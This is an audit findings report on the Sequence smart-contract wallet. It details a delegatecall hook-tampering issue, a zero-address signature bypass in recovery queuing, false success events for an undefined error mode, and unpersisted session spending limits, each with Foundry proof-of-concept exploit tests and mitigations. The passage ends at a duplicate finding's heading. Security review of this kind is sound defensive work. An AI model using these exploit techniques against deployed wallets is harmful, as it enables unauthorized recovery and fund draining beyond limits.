# 2025 10 sequence - Findings Report
## Commit hash: b0e5fb15bf6735ec9aaba02f5eca28a7882d815d

##Findings by Pattern


 **Derived From** : Any mutation of the hooks mapping must occur only via addHook/removeHook; delegate-called hook code must not be able to change readHook(selector)

[L-1]. Registered hook can arbitrarily mutate hooks mapping via delegatecall, bypassing onlySelf and DefinedHook event
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : Invalid ECDSA check allows zero-address signer to pass, enabling unauthorized queue

[L-2]. Auth bypass in Recovery.isValidSignature lets anyone queue recovery payloads for the zero-address guardian
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : If external call at index i returns false, then (behaviorOnError==0 => emit CallFailed), OR (behaviorOnError==1 => revert Calls.Reverted), OR (behaviorOnError==2 => emit CallAborted and break); never emit CallSucceeded for a failed call

[L-3]. Guest.fallback emits CallSucceeded on failed call when behaviorOnError==3, enabling false-success signaling and bypassing fallback-only flow
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Cumulative session-usage not persisted due to missing write-back, enabling limit bypass across txs

[H-4]. Cumulative rule usage not persisted in PermissionValidator.validatePermission lets session signers exceed limits across multiple payloads
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresRole



 **Derived From** : queuePayload auth bypass when _signer is zero due to ecrecover(…) == address(0) acceptance

[M-5]. Auth bypass: Anyone can queue recovery payloads for signer=address(0) via invalid 64-byte EIP-2098 signature
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : For any call with delegateCall == true, call.value must be 0; otherwise ETH is not forwarded and value is silently ignored.

[L-6]. delegateCall silently ignores per-call value in Stage1Module.execute causing ETH/accounting mismatch
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : If _signature consists of exactly one FLAG_BRANCH item whose inner bytes decode to (nVerified = true, nRoot), then the returned root should equal nRoot

[M-7]. Branch-first folding in Recovery._recoverBranch corrupts root (keccak256(0||nRoot)) causing false negatives for valid recovery signatures
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : For implicit sessions: attestation.authData.issuedAt <= block.timestamp

[L-8]. Implicit sessions accept future-dated attestations (no recency bound) enabling time-warped approvals
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresRole


### Number of Findings
- C: 0
- H: 1
- M: 2
- L: 5
- I: 0

##Findings by Pattern


 **Derived From** : Any mutation of the hooks mapping must occur only via addHook/removeHook; delegate-called hook code must not be able to change readHook(selector)

## [L-1]. Registered hook can arbitrarily mutate hooks mapping via delegatecall, bypassing onlySelf and DefinedHook event

## Derived From Pattern/Invariant
Any mutation of the hooks mapping must occur only via addHook/removeHook; delegate-called hook code must not be able to change readHook(selector)

## Exploit Type
UntrustedDelegateCall

## Location
Hooks.fallback

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
## Minimim Privilege Required
Permissionless

## Description
Hooks.fallback performs a delegatecall into the registered hook implementation for the given selector: (bool success, bytes memory result) = target.delegatecall(msg.data). Because the hook executes in the wallet's storage context, a malicious or compromised hook can directly sstore or call Storage.writeBytes32Map(HOOKS_KEY, ...) to add/replace/remove other hooks, without going through addHook/removeHook (onlySelf) and without emitting DefinedHook. This violates access control on hook management and enables silent injection of arbitrary delegatecall targets for new selectors.

Vulnerable snippet:

function fallback() external payable {
  if (msg.data.length >= 4) {
    address target = _readHook(bytes4(msg.data));
    if (target != address(0)) {
      (bool success, bytes memory result) = target.delegatecall(msg.data);
      assembly {
        if iszero(success) { revert(add(result, 32), mload(result)) }
        return(add(result, 32), mload(result))
      }
    }
  }
}

Impact: Once a single malicious hook is installed, any EOA can trigger fallback with that selector to delegatecall attacker code, which can then:
- Inject new hooks for arbitrary selectors that point to attacker logic (persistent backdoor),
- Replace/remove existing hooks,
- From the injected hooks, perform arbitrary logic in wallet context (including value/token transfers),
all without an audit trail (no DefinedHook event) and bypassing the onlySelf gate intended for hook administration.

## Impact
A hook registered into the wallet (via an authorized, onlySelf-gated update) can, when invoked, directly write to the wallet’s storage and mutate the hooks mapping without emitting DefinedHook. This enables stealthy replacement/injection of other hook selectors and persistence without events. However, installing such a malicious hook already gives the attacker arbitrary code execution via delegatecall in the wallet context, which is sufficient to exfiltrate funds. Therefore, the incremental risk is primarily the lack of audit trail and silent persistence/backdooring of additional selectors, not new asset theft vectors beyond those already implied by installing an untrusted hook.

## Proof of Concept
1) Precondition: selector 0xaaaaaaaa is registered to hookA (malicious).
2) Attacker sends a call to the wallet with calldata starting with 0xaaaaaaaa, triggering fallback.
3) fallback delegatecalls hookA. Inside hookA’s code (executing in the wallet storage context), it computes keccak256(abi.encode(HOOKS_KEY, bytes32(0xbbbbbbbb))) and sstore’s the mapping to attackerImpl.
4) No addHook/removeHook is called and no DefinedHook is emitted.
5) readHook(0xbbbbbbbb) now returns attackerImpl; any call with selector 0xbbbbbbbb will delegatecall into attackerImpl code.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";
import {Hooks} from "src/modules/Hooks.sol";

contract MaliciousHook {
  // Immutable parameters embedded in code, readable under delegatecall
  bytes4 private immutable selToMutate;
  address private immutable newImpl;
  // HOOKS_KEY copied from Hooks
  bytes32 private constant HOOKS_KEY = bytes32(0xbe27a319efc8734e89e26ba4bc95f5c788584163b959f03fa04e2d7ab4b9a120);

  constructor(bytes4 _selToMutate, address _newImpl) {
    selToMutate = _selToMutate;
    newImpl = _newImpl;
  }

  // Called via delegatecall by Hooks.fallback
  fallback() external payable {
    // Compute the storage slot for hooks[selToMutate]
    bytes32 slot = keccak256(abi.encode(HOOKS_KEY, bytes32(selToMutate)));
    // Write attacker implementation into the wallet's storage
    assembly {
      sstore(slot, newImpl)
    }
  }
}

contract Hooks_HookTamper_Test is Test {
  Hooks private wallet;
  address private attacker = address(0xA11CE);

  // Same HOOKS_KEY constant and mapping slot derivation as Hooks.Storage.writeBytes32Map
  bytes32 private constant HOOKS_KEY = bytes32(0xbe27a319efc8734e89e26ba4bc95f5c788584163b959f03fa04e2d7ab4b9a120);

  function setUp() public {
    wallet = new Hooks();
  }

  function _hookSlot(bytes4 sel) internal pure returns (bytes32) {
    return keccak256(abi.encode(HOOKS_KEY, bytes32(sel)));
  }

  function test_MaliciousHookCanMutateOtherSelectorWithoutOnlySelfOrEvent() public {
    bytes4 selA = 0xaaaaaaaa; // pre-installed hook selector
    bytes4 selB = 0xbbbbbbbb; // selector to hijack

    // Deploy malicious hook that, when delegatecalled via selA, will set hooks[selB] = attackerImpl
    address attackerImpl = address(0xBEEFCAFE);
    MaliciousHook hookA = new MaliciousHook(selB, attackerImpl);

    // Simulate pre-state: hooks[selA] = address(hookA)
    bytes32 slotA = _hookSlot(selA);
    vm.store(address(wallet), slotA, bytes32(uint256(uint160(address(hookA)))));

    // Sanity: selB unassigned
    assertEq(wallet.readHook(selB), address(0));

    // Record logs to assert no DefinedHook event is emitted
    vm.recordLogs();

    // Attacker triggers fallback for selA -> delegatecall into malicious hookA
    vm.prank(attacker);
    (bool ok, ) = address(wallet).call(abi.encodePacked(selA));
    require(ok, "delegatecall failed");

    // Hooks mapping for selB changed without addHook/removeHook and without DefinedHook event
    assertEq(wallet.readHook(selB), attackerImpl, "hooks[selB] not updated");

    // Ensure no DefinedHook was emitted
    Vm.Log[] memory logs = vm.getRecordedLogs();
    bytes32 definedHookSig = keccak256("DefinedHook(bytes4,address)");
    uint256 count;
    for (uint256 i = 0; i < logs.length; i++) {
      if (logs[i].topics.length > 0 && logs[i].topics[0] == definedHookSig) {
        count++;
      }
    }
    assertEq(count, 0, "DefinedHook should not be emitted");
  }
}


## Suggested Mitigation
If hooks must be untrusted, do not delegatecall them. Replace delegatecall-based hooks with a call-based interface that returns actions/data for the wallet to execute; this prevents hook code from writing the wallet’s storage and from mutating the registry without going through audited, event-emitting code paths. Note that simply moving the hooks mapping to an external registry does not prevent mutation by delegatecalled hook code, since external calls made from delegatecall execute with msg.sender == wallet and can still satisfy access controls. If delegatecall is required by design, accept and document that installed hooks are fully trusted and can arbitrarily mutate wallet storage (including the hooks registry) and that event emission cannot be enforced.





 **Derived From** : Invalid ECDSA check allows zero-address signer to pass, enabling unauthorized queue

## [L-2]. Auth bypass in Recovery.isValidSignature lets anyone queue recovery payloads for the zero-address guardian

## Derived From Pattern/Invariant
Invalid ECDSA check allows zero-address signer to pass, enabling unauthorized queue

## Exploit Type
AuthByPass

## Location
Recovery.isValidSignature

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
Permissionless

## Description
Recovery.queuePayload relies on isValidSignature to authenticate _signer. In the 64-byte ECDSA path, ecrecover(rPayloadHash, v, r, s) is compared directly to _signer without checking for address(0). Since ecrecover returns address(0) on invalid signatures, providing _signer = address(0) causes any 64-byte blob to pass authentication. This permits unauthenticated queueing under the zero-address guardian and can satisfy Recovery’s gating if a wallet’s recovery configuration mistakenly includes address(0) as a guardian, enabling unauthorized recovery flows.

Vulnerable snippet:

function isValidSignature(
  address _wallet,
  address _signer,
  Payload.Decoded calldata _payload,
  bytes calldata _signature
) internal view returns (bool) {
  bytes32 rPayloadHash = recoveryPayloadHash(_wallet, _payload);

  if (_signature.length == 64) {
    bytes32 r; bytes32 s; uint8 v; (r, s, v,) = _signature.readRSVCompact(0);
    address addr = ecrecover(rPayloadHash, v, r, s);
    if (addr == _signer) { // addr can be address(0) on invalid sigs
      return true;        // passes if _signer == address(0)
    }
  }
  ...
}

## Impact
Anyone can queue arbitrary recovery payloads for the zero-address signer due to ecrecover returning address(0) on invalid signatures and a missing zero-address check. This enables storage/event spam under (wallet, 0x0) and can illegitimately satisfy Recovery’s verification if, and only if, the wallet’s recovery inner tree mistakenly includes address(0) as a guardian, potentially enabling unauthorized recovery. As this requires a user/configuration mistake (zero-address guardian) and otherwise cannot compromise assets, the impact is limited to misconfigurations and griefing.

## Proof of Concept
Steps to exploit:
1) Pick any victim wallet address W.
2) Build a minimal Payload (e.g., KIND_MESSAGE) and compute payloadHash = Payload.hashFor(payload, W).
3) Call queuePayload(W, address(0), payload, fakeSig64) where fakeSig64 is any 64-byte blob (e.g., zeros). In isValidSignature, ecrecover(...) returns address(0) for an invalid signature, which equals _signer, so authentication passes and the payload is queued for (W, 0x0, payloadHash).
4) To pass Recovery’s verification, craft a sapient signature branch with a single FLAG_RECOVERY_LEAF for signer=address(0), requiredDeltaTime=0, minTimestamp=0. Calling recoverSapientSignatureCompact(payloadHash, recoveryLeafSig) from W returns a valid root and sets verified=true because the queued timestamp exists and delay=0.
5) This only leads to end-to-end unauthorized recovery if the wallet’s configured Recovery sapient inner root actually includes the zero-address guardian leaf; otherwise, the recovered root won’t match the expected configuration and the overall validation will fail.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Recovery} from "src/extensions/recovery/Recovery.sol";
import {Payload} from "src/modules/Payload.sol";

contract RecoveryZeroSignerBypassTest is Test {
  Recovery rec;
  address wallet;
  address attacker;

  function setUp() public {
    rec = new Recovery();
    wallet = address(0xBEEF);
    attacker = address(0xA11CE);
  }

  function _messagePayload() internal pure returns (Payload.Decoded memory p) {
    p.kind = Payload.KIND_MESSAGE;
    p.noChainId = false;
    p.message = bytes("hello");
  }

  function test_Queue_BypassForZeroSigner_AllowsAny64ByteSig() public {
    Payload.Decoded memory p = _messagePayload();
    bytes32 payloadHash = Payload.hashFor(p, wallet);

    // Garbage 64-byte signature. ecrecover(...) = address(0)
    bytes memory fakeSig = new bytes(64);

    // Anyone can queue under signer=address(0)
    vm.prank(attacker);
    rec.queuePayload(wallet, address(0), p, fakeSig);

    uint256 ts = rec.timestampForQueuedPayload(wallet, address(0), payloadHash);
    assertGt(ts, 0, "queued timestamp should be set for zero signer");

    // Build a Recovery leaf signature: FLAG_RECOVERY_LEAF(1), signer=0x0, delta=0, minTs=0
    bytes memory recoveryLeafSig = abi.encodePacked(
      uint8(1),                // FLAG_RECOVERY_LEAF
      address(0),              // signer = address(0)
      bytes3(uint24(0)),       // requiredDeltaTime = 0
      bytes8(uint64(0))        // minTimestamp = 0
    );

    // From the wallet context, recover sapient root; should be verified (delta=0)
    vm.prank(wallet);
    bytes32 root = rec.recoverSapientSignatureCompact(payloadHash, recoveryLeafSig);

    bytes32 expectedLeaf = keccak256(
      abi.encodePacked("Sequence recovery leaf:\n", address(0), uint256(0), uint256(0))
    );
    assertEq(root, expectedLeaf, "sapient root must equal single recovery leaf for zero signer");
  }

  function test_QueuePayload_FailsForNonZeroSigner_WithInvalid64ByteSig() public {
    Payload.Decoded memory p = _messagePayload();
    bytes memory fakeSig = new bytes(64); // invalid ECDSA

    vm.prank(attacker);
    vm.expectRevert(); // InvalidSignature custom error
    rec.queuePayload(wallet, address(0x1234), p, fakeSig);
  }
}


## Suggested Mitigation
In isValidSignature (and/or at the start of queuePayload), explicitly reject zero-address signers and ensure ecrecover did not return address(0):
- if (_signer == address(0)) return false;
- In the ECDSA branch, only accept when addr != address(0) && addr == _signer.
Optionally add: require(_signer != address(0), "invalid signer"); in queuePayload to eliminate any accidental use of the zero-address mapping and prevent storage spam. Consider also validating v and s (EIP-2 lower-S) before ecrecover for robustness.





 **Derived From** : If external call at index i returns false, then (behaviorOnError==0 => emit CallFailed), OR (behaviorOnError==1 => revert Calls.Reverted), OR (behaviorOnError==2 => emit CallAborted and break); never emit CallSucceeded for a failed call

## [L-3]. Guest.fallback emits CallSucceeded on failed call when behaviorOnError==3, enabling false-success signaling and bypassing fallback-only flow

## Derived From Pattern/Invariant
If external call at index i returns false, then (behaviorOnError==0 => emit CallFailed), OR (behaviorOnError==1 => revert Calls.Reverted), OR (behaviorOnError==2 => emit CallAborted and break); never emit CallSucceeded for a failed call

## Exploit Type
EventConsistency

## Location
Guest.fallback

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
Permissionless

## Description
Guest.fallback decodes behaviorOnError from the top 2 bits of the per-call flags (bits 7..6). Only values 0..2 are defined, but the code does not guard against the undefined value 3. If the external call fails and behaviorOnError==3, none of the failure branches match, and execution falls through to emit Calls.CallSucceeded(_opHash, i) despite the call failing. This violates the event/control-flow invariant and can be weaponized to: (1) produce misleading success events off-chain, and (2) skip onlyFallback follow-up calls that would otherwise execute after a failure. Vulnerable snippet (Guest._dispatchGuest):

bool success = LibOptim.call(call.to, call.value, gasLimit == 0 ? gasleft() : gasLimit, call.data);
if (!success) {
  if (call.behaviorOnError == Payload.BEHAVIOR_IGNORE_ERROR) { ... emit Calls.CallFailed(...); continue; }
  if (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) { revert ... }
  if (call.behaviorOnError == Payload.BEHAVIOR_ABORT_ON_ERROR) { emit Calls.CallAborted(...); break; }
}
emit Calls.CallSucceeded(_opHash, i);

## Impact
If behaviorOnError is set to the undefined value 3 and the external call fails, the code falls through and emits CallSucceeded instead of a failure/abort event. This can mislead off-chain observers and monitoring/automation relying on accurate success/failure signaling, and causes the next onlyFallback call to be skipped because errorFlag is not set. There is no direct loss of assets; exploitation requires crafting malformed payload flags. The same pattern appears in both Guest._dispatchGuest and Calls._execute and should be addressed consistently.

## Proof of Concept
- Deploy Guest and a Reverter contract that always reverts.
- Craft a packed payload with a single call to Reverter and per-call flags having behaviorOnError=3 (flags top bits 11). The call fails but Guest emits CallSucceeded instead of CallFailed/Aborted.
- Craft a 2-call payload where the first call fails with behaviorOnError=3 and the second call is onlyFallback=true. The bug leaves errorFlag=false and the second call is skipped (CallSkipped), bypassing the intended fallback execution.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Guest} from "src/Guest.sol";

contract Reverter {
    function boom() external payable {
        revert("boom");
    }
}

contract Receiver {
    bool public called;
    function ping() external { called = true; }
}

contract GuestFallbackBehaviorOnErrorTest is Test {
    Guest guest;
    Reverter rev;
    Receiver recv;

    function setUp() public {
        guest = new Guest();
        rev = new Reverter();
        recv = new Receiver();
        vm.deal(address(guest), 1 ether);
    }

    function test_FalseSuccessEventEmittedOnFailWithBehavior3() public {
        bytes memory calld = abi.encodeWithSelector(Reverter.boom.selector);
        bytes memory payload = _buildSingleCall(false, address(rev), calld, 0, false, false, 3);

        vm.recordLogs();
        (bool ok, ) = address(guest).call(payload);
        assertTrue(ok, "Guest should not revert on behavior==3");

        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 sigSucceeded = keccak256("CallSucceeded(bytes32,uint256)");
        bytes32 sigFailed = keccak256("CallFailed(bytes32,uint256,bytes)");
        bool emittedSucceeded;
        bool emittedFailed;
        for (uint i=0; i<entries.length; i++) {
            if (entries[i].topics.length > 0) {
                if (entries[i].topics[0] == sigSucceeded) {
                    emittedSucceeded = true;
                } else if (entries[i].topics[0] == sigFailed) {
                    emittedFailed = true;
                }
            }
        }
        assertEq(emittedSucceeded, true, "BUG: falsely emitted CallSucceeded on failure");
        assertEq(emittedFailed, false, "BUG: did not emit CallFailed on failure");
    }

    function test_OnlyFallbackSkippedEvenThoughPrevFailedWithBehavior3() public {
        bytes memory data1 = abi.encodeWithSelector(Reverter.boom.selector);
        bytes memory data2 = abi.encodeWithSelector(Receiver.ping.selector);
        bytes memory payload = _buildTwoCalls(
            false, address(rev), data1, 0, false, false, 3,
            false, address(recv), data2, 0, false, true, 0
        );

        vm.recordLogs();
        (bool ok, ) = address(guest).call(payload);
        assertTrue(ok, "Guest should not revert");

        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 sigSkipped = keccak256("CallSkipped(bytes32,uint256)");
        bool skippedSecond;
        for (uint i=0; i<entries.length; i++) {
            if (entries[i].topics.length > 0 && entries[i].topics[0]==sigSkipped) {
                (bytes32 /*opHash*/, uint256 idx) = abi.decode(entries[i].data, (bytes32,uint256));
                if (idx == 1) skippedSecond = true;
            }
        }
        assertEq(skippedSecond, true, "BUG: second onlyFallback was skipped due to false success");
        assertEq(recv.called(), false, "Receiver should not have been called");
    }

    function _encodeUint24(uint24 x) internal pure returns (bytes memory out) {
        out = new bytes(3);
        out[0] = bytes1(uint8(x >> 16));
        out[1] = bytes1(uint8(x >> 8));
        out[2] = bytes1(uint8(x));
    }

    function _buildSingleCall(
        bool selfCall,
        address to,
        bytes memory data,
        uint256 value,
        bool hasGasLimit,
        bool onlyFallback,
        uint8 behavior // 0..3
    ) internal pure returns (bytes memory payload) {
        // globalFlag: space=0 (bit0=1), singleCall (bit4=1)
        bytes1 globalFlag = 0x11;
        uint8 flags = 0;
        if (selfCall) { flags |= 0x01; }
        if (value != 0) { flags |= 0x02; }
        if (data.length > 0) { flags |= 0x04; }
        if (hasGasLimit) { flags |= 0x08; }
        if (onlyFallback) { flags |= 0x20; }
        flags |= (behavior << 6);
        bytes memory packed = abi.encodePacked(globalFlag, bytes1(uint8(flags)));
        if (!selfCall) {
            packed = abi.encodePacked(packed, to);
        }
        if (value != 0) {
            packed = abi.encodePacked(packed, value);
        }
        if (data.length > 0) {
            packed = abi.encodePacked(packed, _encodeUint24(uint24(data.length)), data);
        }
        if (hasGasLimit) {
            packed = abi.encodePacked(packed, uint256(100_000));
        }
        return packed;
    }

    function _buildTwoCalls(
        bool selfCall1, address to1, bytes memory data1, uint256 value1, bool hasGas1, bool onlyFb1, uint8 beh1,
        bool selfCall2, address to2, bytes memory data2, uint256 value2, bool hasGas2, bool onlyFb2, uint8 beh2
    ) internal pure returns (bytes memory payload) {
        // globalFlag: space=0 (bit0=1), multi-call (bit4=0), count uses 1 byte (bit5=0)
        bytes1 globalFlag = 0x01;
        bytes memory packed = abi.encodePacked(globalFlag, bytes1(uint8(2))); // two calls
        // call1
        uint8 f1 = 0;
        if (selfCall1) { f1 |= 0x01; }
        if (value1 != 0) { f1 |= 0x02; }
        if (data1.length > 0) { f1 |= 0x04; }
        if (hasGas1) { f1 |= 0x08; }
        if (onlyFb1) { f1 |= 0x20; }
        f1 |= (beh1 << 6);
        packed = abi.encodePacked(packed, bytes1(f1));
        if (!selfCall1) { packed = abi.encodePacked(packed, to1); }
        if (value1 != 0) { packed = abi.encodePacked(packed, value1); }
        if (data1.length > 0) { packed = abi.encodePacked(packed, _encodeUint24(uint24(data1.length)), data1); }
        if (hasGas1) { packed = abi.encodePacked(packed, uint256(100_000)); }

        // call2
        uint8 f2 = 0;
        if (selfCall2) { f2 |= 0x01; }
        if (value2 != 0) { f2 |= 0x02; }
        if (data2.length > 0) { f2 |= 0x04; }
        if (hasGas2) { f2 |= 0x08; }
        if (onlyFb2) { f2 |= 0x20; }
        f2 |= (beh2 << 6);
        packed = abi.encodePacked(packed, bytes1(f2));
        if (!selfCall2) { packed = abi.encodePacked(packed, to2); }
        if (value2 != 0) { packed = abi.encodePacked(packed, value2); }
        if (data2.length > 0) { packed = abi.encodePacked(packed, _encodeUint24(uint24(data2.length)), data2); }
        if (hasGas2) { packed = abi.encodePacked(packed, uint256(100_000)); }

        return packed;
    }
}


## Suggested Mitigation
Treat any undefined behaviorOnError value as invalid. In both Guest._dispatchGuest and Calls._execute, after the three defined cases for !success, add a default else to revert with a specific error (e.g., InvalidBehaviorOnError) or enforce call.behaviorOnError <= 2 before the call logic and revert otherwise. Optionally, change behaviorOnError to a bounded uint8 and validate during decoding (Payload.fromPackedCalls) to reject values > 2, keeping event semantics consistent across modules.





 **Derived From** : Cumulative session-usage not persisted due to missing write-back, enabling limit bypass across txs

## [H-4]. Cumulative rule usage not persisted in PermissionValidator.validatePermission lets session signers exceed limits across multiple payloads

## Derived From Pattern/Invariant
Cumulative session-usage not persisted due to missing write-back, enabling limit bypass across txs

## Exploit Type
AccountingInvariantViolation

## Location
PermissionValidator.validatePermission

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
RequiresRole

## Description
validatePermission computes cumulative usage for a rule into a local UsageLimit, but never writes the updated usageAmount back into newUsageLimits. As a result, sessionUsageLimits returned to the caller contain zeroed usageAmount for cumulative rules, so the required incrementUsageLimit call can be satisfied with zero increments, leaving storage at 0. An attacker can split usage across multiple payloads to bypass cumulative quotas. Vulnerable snippet (missing write-back):

// after locating/creating the UsageLimit slot
uint256 value256 = uint256(value) + previousUsage;
usageLimit.usageAmount = value256; // BUG: not written back to newUsageLimits[j]
value = bytes32(value256);

This breaks the accounting invariant that cumulative usage monotonically persists to storage across payloads.

## Impact
Because cumulative rule usage is not written back into the returned UsageLimit array, intra-payload accumulation does not occur and the first-call incrementUsageLimit can be satisfied with zero amounts. As a result, cumulative quotas are never persisted to storage across payloads. A session signer can exceed configured per-parameter budgets (e.g., token spend caps) by splitting calls across payloads or even within a single payload. This allows draining beyond intended limits, breaking session safety guarantees.

## Proof of Concept
1) Configure an explicit session with a cumulative rule: target: T.spend(uint256), operation: LESS_THAN_OR_EQUAL, value: 100.
2) Attacker constructs payload P1 with a single business call spend(60). validatePermission passes because it compares 60 + storage(0) <= 100. However, the returned UsageLimit has usageAmount=0 due to missing write-back. The required first call to incrementUsageLimit can be formed with these zero amounts and will pass _validateLimitUsageIncrement and incrementUsageLimit (no decrement), leaving storage at 0.
3) Attacker constructs payload P2 with spend(60) again. Since storage is still 0 and returned limits again contain usageAmount=0, validation passes and the enforced increment call again encodes zero increments. Total consumed = 120 > 100, but enforcement never triggers across payloads.
4) Additionally, within a single payload containing two spend(60) calls, missing write-back prevents intra-payload accumulation. The second call still compares against storage(0), allowing 60 + 60 to pass when it should fail.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Payload} from "src/modules/Payload.sol";
import {Permission, ParameterRule, ParameterOperation, UsageLimit} from "src/extensions/sessions/explicit/Permission.sol";
import {IExplicitSessionManager, SessionUsageLimits} from "src/extensions/sessions/explicit/IExplicitSessionManager.sol";
import {ExplicitSessionManager} from "src/extensions/sessions/explicit/ExplicitSessionManager.sol";

contract DummyTarget {
  function spend(uint256 amount) external pure returns (bool) {
    amount;
    return true;
  }
}

// Harness exposes internal functions and validatePermission
contract ManagerHarness is ExplicitSessionManager {
  function callValidate(
    Permission memory permission,
    Payload.Call calldata call_,
    address wallet,
    address signer,
    UsageLimit[] memory usageLimits
  ) external view returns (bool, UsageLimit[] memory) {
    return validatePermission(permission, call_, wallet, signer, usageLimits);
  }

  function getUsageExtern(address wallet, bytes32 usageHash) external view returns (uint256) {
    return getLimitUsage(wallet, usageHash);
  }

  function setUsageForTest(address wallet, bytes32 usageHash, uint256 amount) external {
    setLimitUsage(wallet, usageHash, amount);
  }

  function checkIncrement(Payload.Call calldata firstCall, SessionUsageLimits[] memory sessionUsageLimits) external view {
    _validateLimitUsageIncrement(firstCall, sessionUsageLimits);
  }
}

contract CumulativeBypassTest is Test {
  ManagerHarness internal h;
  DummyTarget internal t;
  address internal wallet = address(0xBEEF);
  address internal signer = address(0xABCD);

  function setUp() public {
    h = new ManagerHarness();
    t = new DummyTarget();
  }

  function _perm() internal view returns (Permission memory p) {
    p.target = address(t);
    p.rules = new ParameterRule[](1);
    p.rules[0] = ParameterRule({
      cumulative: true,
      operation: ParameterOperation.LESS_THAN_OR_EQUAL,
      value: bytes32(uint256(100)),
      offset: 4, // first arg of spend(uint256)
      mask: bytes32(type(uint256).max)
    });
  }

  function _callSpend(uint256 amount) internal view returns (Payload.Call memory c) {
    c.to = address(t);
    c.value = 0;
    c.data = abi.encodeWithSignature("spend(uint256)", amount);
    c.gasLimit = 0;
    c.delegateCall = false;
    c.onlyFallback = false;
    c.behaviorOnError = Payload.BEHAVIOR_REVERT_ON_ERROR;
  }

  function _flatten(SessionUsageLimits[] memory sul) internal pure returns (UsageLimit[] memory out) {
    uint256 total;
    for (uint256 i = 0; i < sul.length; i++) {
      total += sul[i].limits.length;
      if (sul[i].totalValueUsed > 0) total++;
    }
    out = new UsageLimit[](total);
    uint256 k;
    for (uint256 i = 0; i < sul.length; i++) {
      for (uint256 j = 0; j < sul[i].limits.length; j++) {
        out[k++] = sul[i].limits[j];
      }
      if (sul[i].totalValueUsed > 0) {
        out[k++] = UsageLimit({
          usageHash: keccak256(abi.encode(sul[i].signer, h.VALUE_TRACKING_ADDRESS())),
          usageAmount: sul[i].totalValueUsed
        });
      }
    }
  }

  function test_BypassCumulativeAcrossPayloads_and_ZeroIncrementAccepted() public {
    Permission memory p = _perm();
    Payload.Call memory c1 = _callSpend(60);

    UsageLimit[] memory empty;
    (bool ok1, UsageLimit[] memory limits1) = h.callValidate(p, c1, wallet, signer, empty);
    assertTrue(ok1, "first call should be valid");

    // usageHash matches what the validator uses
    bytes32 usageHash = keccak256(abi.encode(signer, p, 0));
    assertEq(limits1.length, 1, "one limit tracked");
    assertEq(limits1[0].usageHash, usageHash, "usage hash matches");
    assertEq(limits1[0].usageAmount, 0, "BUG: usage not written back into returned limits");

    // Prove that the mandatory first-call increment can be satisfied with zero amounts
    SessionUsageLimits[] memory sul = new SessionUsageLimits[](1);
    sul[0] = SessionUsageLimits({ signer: signer, limits: limits1, totalValueUsed: 0 });

    UsageLimit[] memory flat = _flatten(sul); // equals limits1 (zero amounts)
    Payload.Call memory inc;
    inc.to = address(h);
    inc.value = 0;
    inc.data = abi.encodeWithSelector(h.incrementUsageLimit.selector, flat);
    inc.gasLimit = 0;
    inc.delegateCall = false;
    inc.onlyFallback = false;
    inc.behaviorOnError = Payload.BEHAVIOR_REVERT_ON_ERROR;

    // This must not revert: zero-amount increments are accepted due to bugged limits
    h.checkIncrement(inc, sul);

    // Storage remains zero as zero increments were "applied"
    assertEq(h.getUsageExtern(wallet, usageHash), 0, "storage usage remains 0");

    // Second payload with another 60 still passes (storage is 0)
    Payload.Call memory c2 = _callSpend(60);
    (bool ok2, ) = h.callValidate(p, c2, wallet, signer, empty);
    assertTrue(ok2, "second call incorrectly valid due to missing persistence");

    // If usage had been persisted to 60, next 60 would fail (120 > 100)
    h.setUsageForTest(wallet, usageHash, 60);
    (bool ok3, ) = h.callValidate(p, c2, wallet, signer, empty);
    assertFalse(ok3, "with persisted usage, second call must be invalid");
  }
}


## Suggested Mitigation
Persist the updated cumulative usage back into the newUsageLimits array at the correct index, and distinguish between (a) not-found in the current payload vs (b) found but legitimately zero. Example:

- Track the index and whether the limit was found in the current payload.
- After computing value256, write the updated struct back to newUsageLimits[idx].

Pseudo-patch:

uint256 idx;
bool foundInPayload;
for (uint256 j = 0; j < newUsageLimits.length; j++) {
  if (newUsageLimits[j].usageHash == bytes32(0)) {
    usageLimit = UsageLimit({ usageHash: usageHash, usageAmount: 0 });
    newUsageLimits[j] = usageLimit;
    actualLimitsCount = j + 1;
    idx = j;
    foundInPayload = true; // we just created it in this payload
    break;
  }
  if (newUsageLimits[j].usageHash == usageHash) {
    usageLimit = newUsageLimits[j];
    previousUsage = usageLimit.usageAmount;
    idx = j;
    foundInPayload = true;
    break;
  }
}
if (!foundInPayload) {
  previousUsage = getLimitUsage(wallet, usageHash);
}
uint256 value256 = uint256(value) + previousUsage;
usageLimit.usageAmount = value256;
newUsageLimits[idx] = usageLimit; // persist back into the array
value = bytes32(value256);

This ensures:
- Intra-payload accumulation works (subsequent rules in the same payload see the updated usageAmount in memory), and
- The limits passed to _validateLimitUsageIncrement reflect the correct non-zero increments, so incrementUsageLimit persists usage monotonically to storage.





 **Derived From** : queuePayload auth bypass when _signer is zero due to ecrecover(…) == address(0) acceptance

## [M-5]. Auth bypass: Anyone can queue recovery payloads for signer=address(0) via invalid 64-byte EIP-2098 signature

